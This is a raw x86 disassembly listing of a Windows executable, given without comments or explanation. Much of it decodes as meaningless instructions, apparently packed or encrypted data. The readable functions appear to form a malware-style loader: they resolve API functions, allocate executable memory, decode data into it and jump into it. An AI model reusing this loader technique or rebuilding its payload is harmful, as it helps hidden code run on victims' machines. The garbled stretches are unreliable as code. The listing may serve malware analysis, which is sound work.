  421355:	lods   al,BYTE PTR ds:[esi]
  421356:	imul   eax,DWORD PTR ds:0x5179b5f0,0x8aca0792
  421360:	jb     0x4213c0
  421362:	cmp    BYTE PTR [edi],al
  421364:	das    
  421365:	mov    dh,BYTE PTR [ebp-0x6]
  421368:	inc    edi
  421369:	sbb    eax,0x4e72411e
  42136e:	daa    
  42136f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421370:	loop   0x421346
  421372:	xor    DWORD PTR [eax+ebp*4+0x666403a5],ecx
  421379:	mov    bl,0x55
  42137b:	jbe    0x421318
  42137d:	fdivr  DWORD PTR [ebx-0x62]
  421380:	sub    eax,0xc80b4050
  421385:	or     esp,DWORD PTR [ebx-0x7d]
  421388:	inc    eax
  421389:	lods   al,BYTE PTR ds:[esi]
  42138a:	sbb    bh,BYTE PTR [ecx]
  42138c:	aas    
  42138d:	aas    
  42138e:	aad    0x64
  421390:	rcl    BYTE PTR [edx],1
  421392:	aad    0x41
  421394:	adc    dl,dh
  421396:	xor    BYTE PTR [edx+0x25baaf6b],0xff
  42139d:	mov    ebp,0x2680240d
  4213a2:	inc    edi
  4213a3:	sbb    esi,DWORD PTR [esi+0x9]
  4213a6:	into   
  4213a7:	leave  
  4213a8:	aaa    
  4213a9:	icebp  
  4213aa:	jmp    0x4213ce
  4213ac:	push   edi
  4213ad:	int3   
  4213ae:	popf   
  4213af:	sub    BYTE PTR [ebx+0xed31264],bh
  4213b5:	pop    esp
  4213b6:	mov    eax,ds:0xc29c8ea0
  4213bb:	push   eax
  4213bc:	dec    esi
  4213bd:	stos   BYTE PTR es:[edi],al
  4213be:	sub    eax,0x4fe608cb
  4213c3:	test   eax,0x52ade985
  4213c8:	push   edi
  4213c9:	sub    edi,DWORD PTR [ebp+0x5cb80caf]
  4213cf:	mov    esp,?
  4213d1:	push   0xffffffcd
  4213d3:	aam    0x4a
  4213d5:	mov    ch,0x19
  4213d7:	adc    eax,0xdc14301a
  4213dc:	call   0xb79d4454
  4213e1:	mov    bh,0xc9
  4213e3:	sbb    DWORD PTR [ecx+0x37400534],ebp
  4213e9:	xor    ah,BYTE PTR [ebx+eiz*2]
  4213ec:	jb     0x4213db
  4213ee:	imul   ecx,DWORD PTR [edi-0x30],0x5636316f
  4213f5:	mov    bl,0x13
  4213f7:	imul   edi,DWORD PTR [edi],0x609d62d9
  4213fd:	std    
  4213fe:	lock out dx,eax
  421400:	sbb    BYTE PTR [ebp-0x27],al
  421403:	mov    eax,0x52b0a00e
  421408:	je     0x42141e
  42140a:	inc    ebp
  42140b:	popf   
  42140c:	pop    esp
  42140d:	ret    
  42140e:	cmp    eax,0x30c46cb4
  421413:	sub    ah,ch
  421415:	loope  0x421452
  421417:	dec    ebp
  421418:	cmp    eax,0xd6ea2aac
  42141d:	sahf   
  42141e:	retf   
  42141f:	(bad)  
  421420:	imul   ebp,DWORD PTR [edx+0xa479256],0xffffffe3
  421427:	jmp    0xb066c34a
  42142c:	jo     0x4214a1
  42142e:	jo     0x4213c1
  421430:	adc    al,0xc4
  421432:	pop    edx
  421433:	stos   BYTE PTR es:[di],al
  421435:	inc    eax
  421436:	cld    
  421437:	sbb    eax,0x5ed47bbc
  42143c:	icebp  
  42143d:	mov    eax,0x70fbd813
  421442:	nop
  421443:	push   DWORD PTR [ebx-0x4541d081]
  421449:	jmp    0x4214a2
  42144b:	jmp    0x421452
  42144d:	xchg   ebp,eax
  42144e:	data16 scas al,BYTE PTR es:[edi]
  421450:	push   ecx
  421451:	sbb    bh,BYTE PTR [ecx-0x22f45add]
  421457:	addr16 inc esi
  421459:	stos   BYTE PTR es:[edi],al
  42145a:	dec    edx
  42145b:	adc    bh,BYTE PTR [ecx]
  42145d:	mov    esp,0x35549b3a
  421462:	mov    al,ds:0x9ae5659d
  421467:	not    BYTE PTR [ecx+0x339e1652]
  42146d:	sub    edx,DWORD PTR [esi+0x2a]
  421470:	mov    ebp,0xa84a7e7d
  421475:	lods   al,BYTE PTR ds:[esi]
  421476:	add    edx,eax
  421478:	ficom  DWORD PTR [edi]
  42147a:	sub    BYTE PTR [edi+0x55],0x84
  42147e:	inc    edi
  42147f:	scas   eax,DWORD PTR es:[edi]
  421480:	cwde   
  421481:	xchg   esp,eax
  421482:	xor    al,0xe7
  421484:	push   0x5a
  421486:	sbb    BYTE PTR [esi+0x47285c89],0x57
  42148d:	std    
  42148e:	add    al,0x9
  421490:	pop    ss
  421491:	retf   
  421492:	push   esp
  421493:	ret    
  421494:	call   0x823:0x99cc07bf
  42149b:	ins    BYTE PTR es:[edi],dx
  42149c:	les    esi,FWORD PTR [edi-0x52ff71cf]
  4214a2:	(bad)  
  4214a4:	dec    ebp
  4214a5:	mov    esp,0xd7742c94
  4214aa:	adc    BYTE PTR [edx+0x2f7b5700],dh
  4214b0:	and    dh,bl
  4214b2:	push   0xcab12581
  4214b7:	imul   ebp,eax,0x64
  4214ba:	fmul   DWORD PTR [bp+0x13ab]
  4214bf:	sub    DWORD PTR [eax-0xd1e4f2b],edi
  4214c5:	(bad)  
  4214c6:	call   0x5c6a2125
  4214cb:	inc    edx
  4214cc:	sbb    al,0xd4
  4214ce:	jno    0x4214f3
  4214d0:	pop    edi
  4214d1:	fmulp  st(2),st
  4214d3:	ret    
  4214d4:	add    ebx,esp
  4214d6:	push   0x2ee4dc66
  4214db:	push   eax
  4214dc:	add    DWORD PTR [eax+0x5a],0x3f
  4214e0:	xchg   BYTE PTR ds:0xf71b2440,al
  4214e6:	lds    eax,FWORD PTR [edx]
  4214e8:	std    
  4214e9:	ret    0xd4bd
  4214ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ed:	ins    DWORD PTR es:[edi],dx
  4214ee:	leave  
  4214ef:	add    BYTE PTR [edx-0x4269baf8],0xd0
  4214f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214f7:	or     BYTE PTR [ecx-0x18aa35bf],bh
  4214fd:	jmp    0xa579b368
  421502:	cli    
  421503:	aam    0xcf
  421505:	pop    eax
  421506:	bound  esp,QWORD PTR [esi+0x23c9b62]
  42150c:	sbb    DWORD PTR [edi],esi
  42150e:	sub    edi,DWORD PTR [esi+edi*1-0x53217700]
  421515:	dec    ecx
  421516:	sub    edx,DWORD PTR [ebx]
  421518:	loope  0x421510
  42151a:	adc    al,0x5a
  42151c:	sub    esp,DWORD PTR [edx]
  42151e:	sbb    DWORD PTR [ebx-0x78],esp
  421521:	xor    edx,DWORD PTR [ebx]
  421523:	ins    BYTE PTR es:[edi],dx
  421524:	or     eax,0x941ff54f
  421529:	or     esi,0x47a5c0aa
  42152f:	aam    0xf7
  421531:	test   al,0xe3
  421533:	jo     0x42156d
  421535:	icebp  
  421536:	or     DWORD PTR [ebp-0x54],eax
  421539:	sbb    BYTE PTR [edi+0x4fe179e],dh
  42153f:	add    cl,BYTE PTR [edi-0x39]
  421542:	rcr    DWORD PTR [esi+0x5d],1
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x70
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x48],0x0
  42155e:	mov    DWORD PTR [ebp-0x70],0x0
  421565:	mov    DWORD PTR [ebp-0x18],0x0
  42156c:	mov    DWORD PTR [ebp-0x10],0x0
  421573:	mov    DWORD PTR [ebp-0x14],0x0
  42157a:	mov    DWORD PTR [ebp-0x30],0x0
  421581:	mov    DWORD PTR [ebp-0x58],0x0
  421588:	mov    DWORD PTR [ebp-0x54],0x0
  42158f:	mov    DWORD PTR [ebp-0x8],0x0
  421596:	mov    DWORD PTR [ebp-0x60],0x0
  42159d:	mov    DWORD PTR [ebp-0x50],0x0
  4215a4:	mov    DWORD PTR [ebp-0xc],0x0
  4215ab:	mov    DWORD PTR [ebp-0x6c],0x0
  4215b2:	mov    DWORD PTR [ebp-0x5c],0x0
  4215b9:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x68],0x0
  4215c7:	mov    DWORD PTR [ebp-0x4],0x0
  4215ce:	mov    DWORD PTR [ebp-0x4c],0x0
  4215d5:	mov    eax,ds:0x428140
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428144
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428148
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42814c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x428130
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x428134
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428138
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x42813c
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x42813e
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x2c],0x40
  42162c:	push   0x64
  42162e:	push   0x0
  421630:	call   DWORD PTR ds:0x42801c
  421636:	lea    eax,[ebp-0xc]
  421639:	push   eax
  42163a:	lea    ecx,[ebp-0xc]
  42163d:	push   ecx
  42163e:	lea    edx,[ebp-0x14]
  421641:	push   edx
  421642:	call   DWORD PTR ds:0x428004
  421648:	test   eax,eax
  42164a:	je     0x421661
  42164c:	push   0x0
  42164e:	mov    eax,DWORD PTR [ebp-0x6c]
  421651:	push   eax
  421652:	call   DWORD PTR ds:0x428118
  421658:	mov    ecx,DWORD PTR [ebp-0xc]
  42165b:	add    ecx,0x1
  42165e:	mov    DWORD PTR [ebp-0xc],ecx
  421661:	push   0x0
  421663:	push   0x0
  421665:	push   0x0
  421667:	call   DWORD PTR ds:0x428000
  42166d:	mov    BYTE PTR [ebp-0x40],0x56
  421671:	call   DWORD PTR ds:0x428018
  421677:	mov    DWORD PTR [ebp-0x30],eax
  42167a:	mov    BYTE PTR [ebp-0x3e],0x72
  42167e:	movzx  edx,WORD PTR [ebp-0x30]
  421682:	test   edx,edx
  421684:	jne    0x4216ce
  421686:	mov    BYTE PTR [ebp-0x34],0x0
  42168a:	mov    DWORD PTR [ebp-0x14],0xe0d
  421691:	lea    eax,[ebp-0x28]
  421694:	push   eax
  421695:	call   DWORD PTR ds:0x428014
  42169b:	mov    DWORD PTR [ebp-0x60],eax
  42169e:	mov    DWORD PTR [ebp-0x50],0x3a
  4216a5:	lea    ecx,[ebp-0x40]
  4216a8:	push   ecx
  4216a9:	mov    edx,DWORD PTR [ebp-0x60]
  4216ac:	push   edx
  4216ad:	call   DWORD PTR ds:0x428010
  4216b3:	mov    DWORD PTR [ebp-0x44],eax
  4216b6:	mov    DWORD PTR [ebp-0x8],0x6735b901
  4216bd:	push   0xa
  4216bf:	call   DWORD PTR ds:0x42811c
  4216c5:	mov    DWORD PTR [ebp-0x68],0x10d757
  4216cc:	jmp    0x4216e3
  4216ce:	mov    BYTE PTR ds:0x445160,0x0
  4216d5:	mov    BYTE PTR ds:0x42bf40,0x0
  4216dc:	mov    BYTE PTR ds:0x442930,0x0
  4216e3:	push   DWORD PTR [ebp-0x2c]
  4216e6:	push   0x1000
  4216eb:	mov    eax,DWORD PTR [ebp-0x14]
  4216ee:	add    eax,0x23
  4216f1:	add    eax,0x23
  4216f4:	push   eax
  4216f5:	xor    eax,eax
  4216f7:	push   eax
  4216f8:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fb:	call   ecx
  4216fd:	mov    edx,eax
  4216ff:	mov    DWORD PTR [ebp-0x4],edx
  421702:	mov    eax,DWORD PTR [ebp-0x68]
  421705:	sub    eax,0xdae0b
  42170a:	mov    DWORD PTR [ebp-0x68],eax
  42170d:	cmp    DWORD PTR [ebp-0x4],0x0
  421711:	jne    0x421724
  421713:	push   0x0
  421715:	push   0x0
  421717:	call   DWORD PTR ds:0x428120
  42171d:	mov    BYTE PTR ds:0x442930,0x0
  421724:	mov    ecx,DWORD PTR [ebp-0x4]
  421727:	add    ecx,DWORD PTR [ebp-0x14]
  42172a:	mov    edx,DWORD PTR [ebp-0x8]
  42172d:	mov    DWORD PTR [ecx],edx
  42172f:	push   DWORD PTR ds:0x428014
  421735:	pop    edx
  421736:	mov    DWORD PTR [ebp-0x70],edx
  421739:	mov    DWORD PTR [ebp-0x30],0x410000
  421740:	call   DWORD PTR ds:0x42800c
  421746:	mov    eax,DWORD PTR [ebp-0x4]
  421749:	add    eax,DWORD PTR [ebp-0x50]
  42174c:	mov    DWORD PTR [ebp-0x5c],eax
  42174f:	mov    ecx,DWORD PTR ds:0x428010
  421755:	mov    DWORD PTR [ebp-0x4c],ecx
  421758:	mov    edx,DWORD PTR [ebp-0x4]
  42175b:	add    edx,DWORD PTR [ebp-0x14]
  42175e:	mov    eax,DWORD PTR [ebp+0x8]
  421761:	mov    DWORD PTR [edx+0x4],eax
  421764:	mov    ecx,DWORD PTR [ebp-0x4]
  421767:	add    ecx,DWORD PTR [ebp-0x14]
  42176a:	mov    DWORD PTR [ebp-0x10],ecx
  42176d:	push   0x0
  42176f:	push   0x1
  421771:	mov    edx,DWORD PTR [ebp-0x60]
  421774:	push   edx
  421775:	call   DWORD PTR ds:0x428030
  42177b:	cmp    DWORD PTR [ebp-0x68],0x0
  42177f:	jbe    0x42179c
  421781:	mov    eax,DWORD PTR [ebp-0x10]
  421784:	push   eax
  421785:	mov    ecx,DWORD PTR [ebp-0x14]
  421788:	push   ecx
  421789:	mov    edx,DWORD PTR [ebp-0x30]
  42178c:	add    edx,DWORD PTR [ebp-0x68]
  42178f:	push   edx
  421790:	mov    eax,DWORD PTR [ebp-0x4]
  421793:	push   eax
  421794:	call   0x411000
  421799:	add    esp,0x10
  42179c:	call   DWORD PTR ds:0x428044
  4217a2:	cmp    DWORD PTR [ebp-0x5c],0x0
  4217a6:	je     0x4217ba
  4217a8:	mov    ecx,DWORD PTR [ebp-0x4c]
  4217ab:	push   ecx
  4217ac:	push   DWORD PTR [ebp-0x70]
  4217af:	mov    esi,DWORD PTR [ebp-0x5c]
  4217b2:	push   edx
  4217b3:	pop    eax
  4217b4:	push   ecx
  4217b5:	nop
  4217b6:	jmp    esi
  4217b8:	jmp    0x4217cd
  4217ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4217bd:	mov    DWORD PTR [ebp-0x18],ecx
  4217c0:	push   0x0
  4217c2:	push   0x83232
  4217c7:	call   DWORD PTR ds:0x42804c
  4217cd:	mov    eax,0x1
  4217d2:	pop    esi
  4217d3:	mov    esp,ebp
  4217d5:	pop    ebp
  4217d6:	ret    
  4217d7:	int3   
  4217d8:	int3   
  4217d9:	int3   
  4217da:	int3   
  4217db:	int3   
  4217dc:	int3   
  4217dd:	int3   
  4217de:	int3   
  4217df:	int3   
  4217e0:	push   ebp
  4217e1:	mov    ebp,esp
  4217e3:	sub    esp,0x8
  4217e6:	push   esi
  4217e7:	push   0x0
  4217e9:	push   0x1
  4217eb:	push   0x0
  4217ed:	mov    DWORD PTR [ebp-0x4],0x0
  4217f4:	call   DWORD PTR ds:0x428030
  4217fa:	mov    eax,ds:0x428018
  4217ff:	push   0x0
  421801:	mov    DWORD PTR [ebp-0x8],eax
  421804:	call   DWORD PTR ds:0x428028
  42180a:	push   0x0
  42180c:	push   0x4e
  42180e:	push   0x1e
  421810:	push   0x0
  421812:	push   0xffffffff
  421814:	call   DWORD PTR ds:0x428024
  42181a:	mov    esi,DWORD PTR [ebp-0x8]
  42181d:	call   esi
  42181f:	mov    DWORD PTR [ebp-0x4],eax
  421822:	cmp    DWORD PTR [ebp-0x4],0x57
  421826:	jne    0x42183d
  421828:	push   0x78342845
  42182d:	call   0x421550
  421832:	add    esp,0x4
  421835:	push   0x0
  421837:	call   DWORD PTR ds:0x428020
  42183d:	xor    eax,eax
  42183f:	pop    esi
  421840:	mov    esp,ebp
  421842:	pop    ebp
  421843:	ret    
  421844:	nop
  421845:	nop
  421846:	nop
  421847:	nop
  421848:	nop
  421849:	nop
  42184a:	nop
  42184b:	nop
  42184c:	nop
  42184d:	nop
  42184e:	nop
  42184f:	nop
  421850:	sub    esp,0x10
  421853:	push   esi
  421854:	push   0x3
  421856:	push   0x0
  421858:	push   0x18
  42185a:	push   0x0
  42185c:	call   DWORD PTR ds:0x428128
  421862:	push   0x0
  421864:	push   0x0
  421866:	call   DWORD PTR ds:0x428124
  42186c:	lea    eax,[esp+0x4]
  421870:	push   eax
  421871:	call   DWORD PTR ds:0x428038
  421877:	push   0x0
  421879:	call   DWORD PTR ds:0x428034
  42187f:	cmp    WORD PTR [esp+0x4],0x0
  421885:	mov    esi,DWORD PTR ds:0x428048
  42188b:	push   0x0
  42188d:	je     0x4218a0
  42188f:	call   esi
  421891:	push   0x0
  421893:	call   0x4217e0
  421898:	add    esp,0x4
  42189b:	jmp    0x4229d8
  4218a0:	push   0xa
  4218a2:	push   0x0
  4218a4:	push   0xffffffff
  4218a6:	call   0x422a00
  4218ab:	jmp    DWORD PTR [ecx-0x39]
  4218ae:	ja     0x42191e
  4218b0:	and    dh,BYTE PTR [ebx-0x53]
  4218b3:	mov    WORD PTR [edx+0x4a],?
  4218b6:	arpl   WORD PTR [ecx-0x24],sp
  4218b9:	rcr    DWORD PTR [ebp+0x7321d6e7],cl
  4218bf:	lods   eax,DWORD PTR ds:[esi]
  4218c0:	mov    WORD PTR [esi+0x4a],?
  4218c3:	arpl   WORD PTR [ecx],sp
  4218c5:	and    ebp,DWORD PTR [ebx*4+0x73216ee7]
  4218cc:	lods   eax,DWORD PTR ds:[esi]
  4218cd:	mov    WORD PTR [esi+0x4a],?
  4218d0:	arpl   WORD PTR [ecx+0x23],sp
  4218d3:	sub    al,0x9d
  4218d5:	out    0x6e,eax
  4218d7:	and    DWORD PTR [ebx-0x53],esi
  4218da:	mov    WORD PTR [esi+0x4a],?
  4218dd:	arpl   WORD PTR [ecx+0x23],sp
  4218e0:	sub    al,0x9d
  4218e2:	out    0x6e,eax
  4218e4:	and    DWORD PTR [ebx-0x53],esi
  4218e7:	mov    WORD PTR [esi+0x2d61634a],cs
  4218ed:	xor    esp,DWORD PTR [edi]
  4218ef:	jmp    0x60bcae62
  4218f4:	lods   eax,DWORD PTR ds:[esi]
  4218f5:	into   
  4218f6:	dec    ebx
  4218f7:	das    
  4218f8:	lods   al,BYTE PTR ds:[esi]
  4218f9:	add    bh,BYTE PTR [eax-0xb]
  4218fc:	mov    ds,WORD PTR ds:0xe3df0301
  421902:	adc    DWORD PTR [eax],edi
  421904:	add    cl,BYTE PTR [ebx+eax*1]
  421907:	dec    edi
  421908:	cld    
  421909:	mov    DWORD PTR [eax],eax
  42190b:	dec    esi
  42190c:	pop    es
  42190d:	(bad)  
  42190e:	out    dx,al
  42190f:	adc    ebp,DWORD PTR [edx+0x11]
  421912:	adc    al,0x4d
  421914:	or     al,0xf4
  421916:	mov    DWORD PTR [esi+0x65],ecx
  421919:	cmp    al,0xfe
  42191b:	lods   al,BYTE PTR ds:[esi]
  42191c:	sbb    esp,DWORD PTR ds:0x210d0407
  421922:	nop
  421923:	in     eax,dx
  421924:	dec    edx
  421925:	and    DWORD PTR [ebx-0x53],esi
  421928:	mov    WORD PTR [esi+0x4a],?
  42192b:	arpl   WORD PTR [esi-0x46],sp
  42192e:	rol    ah,1
  421930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421931:	xchg   esi,eax
  421932:	mov    bl,0x79
  421934:	out    dx,al
  421935:	je     0x42191b
  421937:	inc    eax
  421938:	and    BYTE PTR [ecx-0x7d3ad94f],bl
  42193e:	bound  ebp,QWORD PTR [ebx]
  421940:	sub    al,0x55
  421942:	push   ds
  421943:	jl     0x421957
  421945:	push   es
  421946:	pop    ecx
  421947:	sub    esi,ebp
  421949:	gs jne 0x4219b0
  42194c:	jns    0x421964
  42194e:	xchg   esp,eax
  42194f:	xchg   BYTE PTR [esi],bl
  421951:	mov    dl,0xf1
  421953:	imul   ecx,DWORD PTR [edi],0xffffffa2
  421956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421957:	in     eax,dx
  421958:	sub    cl,bl
  42195a:	loope  0x421903
  42195c:	(bad)  
  42195d:	neg    BYTE PTR [ebx+0x69]
  421960:	sub    ebx,ebx
  421962:	mov    esi,0x20eead97
  421967:	jns    0x42195e
  421969:	je     0x42194f
  42196b:	inc    eax
  42196c:	and    BYTE PTR [ecx+0x1eb526b0],bl
  421972:	cld    
  421973:	sub    ecx,esp
  421975:	jne    0x421983
  421977:	jl     0x421980
  421979:	fwait
  42197a:	repz sub DWORD PTR [eax+edi*8-0x26],esi
  42197f:	sub    DWORD PTR fs:[ebx+0x2f2e863f],ecx
  421986:	imul   ebp,DWORD PTR [ebx+0x61],0xffffffd4
  42198a:	paddsw mm6,QWORD PTR [esi]
  42198d:	inc    esp
  42198e:	jl     0x421937
  421990:	into   
  421991:	mov    ds,eax
  421993:	imul   esi,DWORD PTR [ebx],0xa4f54f4a
  421999:	xchg   esi,eax
  42199a:	mov    bl,0x79
  42199c:	lods   eax,DWORD PTR ds:[esi]
  42199d:	mov    WORD PTR [esi+0x4a],?
  4219a0:	arpl   WORD PTR [ecx+0x23],sp
  4219a3:	sub    al,0xcd
  4219a5:	mov    ds:0xac3f216e,al
  4219aa:	mov    ?,WORD PTR [esi-0x5a]
  4219ad:	cmp    BYTE PTR [esi],0x6c
  4219b0:	sub    al,0x9d
  4219b2:	out    0x6e,eax
  4219b4:	and    DWORD PTR [ebx-0x53],esi
  4219b7:	mov    WORD PTR [esi+0x2860604a],ss
  4219bd:	sub    eax,0xcd6ee797
  4219c2:	ja     0x421971
  4219c4:	mov    WORD PTR [edx+0x4c],?
  4219c7:	arpl   WORD PTR [ecx+0x23],sp
  4219ca:	sub    al,0x9d
  4219cc:	out    0xd3,al
  4219ce:	and    DWORD PTR [ebx-0x53],esi
  4219d1:	pushf  
  4219d2:	jbe    0x421a1e
  4219d4:	arpl   WORD PTR [ecx+0x26],sp
  4219d7:	sub    al,0x9d
  4219d9:	out    0x2f,eax
  4219db:	and    DWORD PTR [ebx-0x43],esi
  4219de:	mov    WORD PTR [esi+0x4a],?
  4219e1:	popa   
  4219e2:	popa   
  4219e3:	and    ebp,DWORD PTR [ecx]
  4219e5:	popf   
  4219e6:	out    0x6e,al
  4219e8:	and    DWORD PTR [ebx-0x53],esi
  4219eb:	mov    WORD PTR [ebx+0x4a],?
  4219ee:	bound  esp,QWORD PTR [ecx+0x23]
  4219f1:	sub    al,0x9d
  4219f3:	out    0x6e,eax
  4219f5:	mov    eax,ds:0x728cad78
  4219fa:	dec    edx
  4219fb:	arpl   sp,bx
  4219fd:	adc    ch,BYTE PTR [ecx]
  4219ff:	popf   
  421a00:	in     eax,0x6e
  421a02:	and    ebx,esi
  421a04:	lods   eax,DWORD PTR ds:[esi]
  421a05:	mov    WORD PTR [esi+0x4a],fs
  421a08:	arpl   WORD PTR [ecx+0x23],si
  421a0b:	sub    al,0x9d
  421a0d:	out    0x7e,eax
  421a0f:	and    DWORD PTR [ebx-0x43],esi
  421a12:	mov    WORD PTR [esi+0x4a],?
  421a15:	arpl   WORD PTR [ecx+0x23],sp
  421a18:	cmp    al,0x9d
  421a1a:	out    0x6e,eax
  421a1c:	and    DWORD PTR [ebx-0x53],esi
  421a1f:	mov    WORD PTR [esi+0x4a],?
  421a22:	arpl   WORD PTR [ecx-0x59],sp
  421a25:	inc    edx
  421a26:	xchg   esi,eax
  421a27:	out    0x7,eax
  421a29:	and    dh,BYTE PTR [ebx-0x53]
  421a2c:	mov    WORD PTR [esi+0x41],es
  421a2f:	arpl   WORD PTR [esi-0x1862d3e2],bp
  421a35:	outs   dx,BYTE PTR ds:[esi]
  421a36:	and    DWORD PTR [ebx-0x53],esi
  421a39:	mov    WORD PTR [esi+0x4a],?
  421a3c:	arpl   WORD PTR [ecx+0x23],sp
  421a3f:	sub    al,0x9d
  421a41:	out    0x6e,eax
  421a43:	and    DWORD PTR [ebx-0x53],esi
  421a46:	mov    WORD PTR [esi+0x4a],?
  421a49:	arpl   WORD PTR [ecx+0x23],sp
  421a4c:	sub    al,0x9d
  421a4e:	out    0x6e,eax
  421a50:	and    DWORD PTR [ebx-0x53],esi
  421a53:	mov    WORD PTR [esi+0x4a],?
  421a56:	arpl   WORD PTR [ecx+0x23],sp
  421a59:	sub    al,0x9d
  421a5b:	out    0x6e,eax
  421a5d:	and    DWORD PTR [ebx-0x53],esi
  421a60:	mov    WORD PTR [esi+0x4a],?
  421a63:	arpl   WORD PTR [ecx+0x23],sp
  421a66:	sub    al,0x9d
  421a68:	out    0x6e,eax
  421a6a:	and    DWORD PTR [ebx-0x53],esi
  421a6d:	mov    WORD PTR [esi+0x4a],?
  421a70:	arpl   WORD PTR [ecx+0x23],sp
  421a73:	sub    al,0x9d
  421a75:	out    0x6e,eax
  421a77:	and    DWORD PTR [ebx-0x53],esi
  421a7a:	mov    WORD PTR [esi+0x4a],?
  421a7d:	arpl   WORD PTR [ecx+0x23],sp
  421a80:	sub    al,0x9d
  421a82:	out    0x6e,eax
  421a84:	and    DWORD PTR [ebx-0x53],esi
  421a87:	mov    WORD PTR [esi+0x4a],?
  421a8a:	arpl   WORD PTR [ecx+0x23],sp
  421a8d:	sub    al,0x9d
  421a8f:	out    0x6e,eax
  421a91:	and    DWORD PTR [ebx-0x53],esi
  421a94:	mov    WORD PTR [esi+0x4a],?
  421a97:	arpl   WORD PTR [ecx+0x23],sp
  421a9a:	sub    al,0x9d
  421a9c:	leave  
  421a9d:	sbb    al,BYTE PTR [ebx+ecx*1-0x27]
  421aa1:	mov    WORD PTR [esi+0x4a],?
  421aa4:	arpl   WORD PTR [ecx+0x28],ax
  421aa7:	sub    al,0x9d
  421aa9:	imul   DWORD PTR [esi+0x21]
  421aac:	jae    0x421a45
  421aae:	mov    BYTE PTR [esi+0x4a],dh
  421ab1:	addr16 popa 
  421ab3:	and    edi,DWORD PTR [eax+ebx*8-0x5c]
  421ab7:	pop    esp
  421ab8:	jne    0x421af6
  421aba:	lods   eax,DWORD PTR ds:[esi]
  421abb:	mov    WORD PTR [esi+0x4a],?
  421abe:	arpl   WORD PTR [ecx+0x3],sp
  421ac1:	sub    al,0x9d
  421ac3:	pop    es
  421ac4:	inc    eax
  421ac5:	push   ebx
  421ac6:	add    bh,bl
  421ac8:	out    dx,eax
  421ac9:	jbe    0x421b15
  421acb:	arpl   WORD PTR [ecx+0x73],sp
  421ace:	sub    al,0x9d
  421ad0:	out    0x5e,eax
  421ad2:	sub    dh,BYTE PTR [ebx-0x53]
  421ad5:	fdiv   QWORD PTR [esi+0x4a]
  421ad8:	arpl   WORD PTR [edi+0x27],bx
  421adb:	sub    al,0x9d
  421add:	out    0x6e,eax
  421adf:	and    DWORD PTR [ebx-0x53],esi
  421ae2:	mov    WORD PTR [esi+0x4a],?
  421ae5:	arpl   WORD PTR [ecx+0x23],sp
  421ae8:	or     al,0x9d
  421aea:	out    0x8e,eax
  421aec:	and    DWORD PTR [ebx-0x53],esi
  421aef:	mov    WORD PTR [esi+0x4a],?
  421af2:	arpl   WORD PTR [ecx+0x23],sp
  421af5:	sub    al,0x9d
  421af7:	out    0x6e,eax
  421af9:	and    DWORD PTR [ebx-0x53],esi
  421afc:	mov    WORD PTR [esi+0x4a],?
  421aff:	arpl   WORD PTR [ecx+0x23],sp
  421b02:	sub    al,0x9d
  421b04:	out    0x6e,eax
  421b06:	and    DWORD PTR [ebx-0x53],esi
  421b09:	mov    WORD PTR [esi+0x4a],?
  421b0c:	arpl   WORD PTR [ecx+0x23],sp
  421b0f:	sub    al,0x9d
  421b11:	out    0x6e,eax
  421b13:	and    DWORD PTR [ebx-0x53],esi
  421b16:	mov    WORD PTR [esi+0x4a],?
  421b19:	arpl   WORD PTR [ecx+0x23],sp
  421b1c:	sub    al,0x9d
  421b1e:	out    0x6e,eax
  421b20:	and    DWORD PTR [ebx-0x53],esi
  421b23:	mov    WORD PTR [esi+0x4a],?
  421b26:	arpl   WORD PTR [ecx+0x23],sp
  421b29:	sub    al,0x9d
  421b2b:	out    0x6e,eax
  421b2d:	and    DWORD PTR [ebx-0x53],esi
  421b30:	mov    WORD PTR [esi+0x4a],?
  421b33:	arpl   WORD PTR [ecx+0x23],sp
  421b36:	sub    al,0x9d
  421b38:	out    0x6e,eax
  421b3a:	and    DWORD PTR [ebx-0x53],esi
  421b3d:	mov    WORD PTR [esi+0x4a],?
  421b40:	arpl   WORD PTR [ecx+0x23],sp
  421b43:	sub    al,0x9d
  421b45:	out    0x6e,eax
  421b47:	and    DWORD PTR [ebx-0x53],esi
  421b4a:	mov    WORD PTR [esi+0x4a],?
  421b4d:	arpl   WORD PTR [ecx+0x23],sp
  421b50:	sub    al,0x9d
  421b52:	out    0x6e,eax
  421b54:	and    DWORD PTR [ebx-0x53],esi
  421b57:	mov    WORD PTR [esi+0x4a],?
  421b5a:	arpl   WORD PTR [ecx+0x23],sp
  421b5d:	sub    al,0x9d
  421b5f:	out    0x6e,eax
  421b61:	and    DWORD PTR [ebx-0x53],esi
  421b64:	mov    WORD PTR [esi+0x4a],?
  421b67:	arpl   WORD PTR [ecx+0x23],sp
  421b6a:	sub    al,0x9d
  421b6c:	out    0x6e,eax
  421b6e:	and    DWORD PTR [ebx-0x53],esi
  421b71:	mov    WORD PTR [esi+0x4a],?
